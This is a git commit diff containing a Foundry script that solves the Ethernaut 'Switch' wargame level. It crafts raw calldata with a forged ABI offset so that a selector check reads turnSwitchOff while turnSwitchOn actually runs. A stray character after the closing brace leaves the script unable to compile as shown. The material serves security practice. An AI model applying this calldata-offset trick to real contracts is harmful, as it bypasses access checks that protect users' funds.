f59afb5481e8ac74994c85d3148cec0ca5fac13e
Ho-Ya-Ho <rkdgh1056@gmail.com>
2025-08-18 18:54:33 +0900

    29_Switch

--- web3/ethernaut/29_Switch/script/Switch.s.sol
+++ web3/ethernaut/29_Switch/script/Switch.s.sol
@@ -5,15 +5,26 @@ import {Script, console} from "forge-std/Script.sol";
 import {Switch} from "../src/Switch.sol";
 
 contract SwitchScript is Script {
-    Switch public counter;
 
-    function setUp() public {}
+    address constant private SWITCH = 0x9999714C5c95Dd569f366319E16CD50Eae9fC803;
 
     function run() public {
         vm.startBroadcast();
 
-        Switch = new Switch();
+        bytes4 offSelector  = bytes4(keccak256("turnSwitchOff()"));
+
+        (bool ok, ) = SWITCH.call(
+            abi.encodePacked(
+                Switch.flipSwitch.selector, // 4bytes
+                abi.encode(96), // offset size = 96bytes
+                abi.encode(0x00), // dummy 32bytes
+                abi.encode(offSelector), // 32bytes start with offSelector
+                abi.encode(4), // actual data size = 4bytes
+                abi.encodeWithSelector(Switch.turnSwitchOn.selector) // 4bytes data
+            )
+        );
+        require(ok);
 
         vm.stopBroadcast();
-    }
+    }ㅎ
 }
